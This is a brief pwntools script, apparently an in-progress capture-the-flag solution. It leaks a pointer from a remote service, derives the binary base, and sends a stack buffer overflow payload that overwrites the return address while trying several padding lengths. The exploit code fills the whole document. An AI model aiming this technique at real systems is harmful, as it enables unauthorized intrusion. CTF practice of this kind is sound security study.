import time
from pwn import *

for i in range(70, 75):
    print("IIIIIIIIIIIIIIIIIIIIIIIIIIIIIII:", i)
    io = remote("localhost", 1337)
    #io = remote("pwn.zh3r0.cf", 1111)
    io.recv(1024)

    io.send("AAAAAAAABBBBBBBB")
    res = io.recv(1024)
    print(res)
    leak = u64(res.split(b"AAAAAAAABBBBBBBB")[1].split(b"\n")[0].ljust(8, b"\x00"))
    bin_base = leak - 0x8b8
    main_plt = bin_base + 0x884
    loop = bin_base + 0x840

    payload = b"A" * 0x28
    payload += p64(loop)
    payload += b"A"*i
    io.sendline(payload)
    print(io.recv(1024))
    io.close()
    time.sleep(0.1)

    #io.interactive()


    #io.send("AAAA")
    #res = io.recv(1024)
    #print(res)
    ##leak = u64(res.split(b"AAAAAAAABBBBBBBB")[1].split(b"\n")[0].ljust(8, b"\x00"))
    #
    ##io.interactive()
